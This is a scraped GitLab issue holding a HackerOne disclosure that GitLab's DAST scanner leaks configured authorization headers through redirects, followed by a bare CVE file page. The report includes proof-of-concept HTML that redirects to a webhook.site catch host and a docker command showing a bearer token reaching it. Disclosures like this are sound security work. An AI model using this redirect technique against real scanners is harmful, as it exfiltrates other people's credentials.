=== Content from gitlab.com_40de09d9_20250114_192835.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# DAST analyzer includes custom request headers in redirects

**[HackerOne report #1767533](https://hackerone.com/reports/1767533)** by `joaxcar` on 2022-11-08, assigned to [@greg](/greg "Greg Myers"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

#### Summary

The latest release 15.5.2 contained a [fix for the DAST scanner](https://about.gitlab.com/releases/2022/11/02/security-release-gitlab-15-5-2-released/#dast-analyzer-sends-custom-request-headers-with-every-request) made to block the scanner from sending custom request headers in every request. Leading to leaked headers. This seems to work, but the scanner still includes the headers if any link redirects to another URL

Take this page as an example <https://joaxcar.com/scan.html> it contains this HTML:

```
<html>
  <head>
    <link rel="stylesheet" href="https://joaxcar.com/redirects/no_cors.php?url=https://webhook.site/REDACTED" />
  </head>
  <body>
  </body>
</html>
```

This page contains a CSS link that is on the same URL, but that will make a redirect to my webhook. This will have the DAST scanner send the configured headers to the webhook URL and thus leaking any credentials.

This is a bit of a forced example, using CSS, but it will have the same effect if it is a link or any other thing the scanner will follow.

#### Steps to reproduce

This will happen if you configure this in the gitlab.com UI as either a build step or a on demand scan. But it is easier to prove by using the DAST scanner directly.

1. Use this link to test the leak. Add a catch server as the URL param

   `https://joaxcar.com/scan.php?url=https://WEBHOOK.SITE`
2. Run this command and replace target with the link you created in step 1

```
docker run --privileged=true  --interactive --tty --rm \
 --env DAST_REQUEST_HEADERS='Authorization: Bearer secret-token' \
--env DAST_ZAP_CONNECT_SLEEP_SECONDS='5' \
 --env DAST_FULL_SCAN_ENABLED=true \
--env DAST_BROWSER_SCAN=true \
registry.gitlab.com/gitlab-org/security-products/dast:latest /analyze -d  \
-t https://joaxcar.com/scan.php?url=https://webhook.site/REDACTED \
 -r report.html
```

3. Your catch server should now have two requests, both containing the auth header containing `secret token` (the scan will first fetch the CSS and then also make a spider request directly to the URL)

[![68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64353938313734362d323539612d343531382d616536322d3932333237363037386161322f637373312e6a7067](data:image/gif;base64...)](/-/project/278964/uploads/694f1421e6bbaae664c3d613e785c8b0/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64353938313734362d323539612d343531382d616536322d3932333237363037386161322f637373312e6a7067.png)

#### Impact

DAST scanner still leak configured headers to other domains if encountering a redirect

#### What is the current *bug* behavior?

Redirects are not filtered

#### What is the expected *correct* behavior?

The same as for regular of site links

#### Output of checks

This bug happens on GitLab.com

#### Impact

DAST scanner still leak configured headers to other domains if encountering a redirect

## Attachments

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Edited Feb 27, 2023 by [Nick Malcolm](/nmalcolm)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_44b9c999_20250114_192833.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2022](/gitlab-org/cves/-/tree/master/2022)
* [**CVE-2022-4317.json**](/gitlab-org/cves/-/blob/master/2022/CVE-2022-4317.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2022/CVE-2022-4317.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2022/CVE-2022-4317.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Mar 04, 2023

  [cfc0fe23](/gitlab-org/cves/-/commit/cfc0fe23c77bbb0c9c0b2ced0288fb00869f21b2)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/cfc0fe23c77bbb0c9c0b2ced0288fb00869f21b2)
  ·
  cfc0fe23

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Mar 04, 2023

  cfc0fe23

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/cfc0fe23c77bbb0c9c0b2ced0288fb00869f21b2)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Mar 04, 2023

Loading


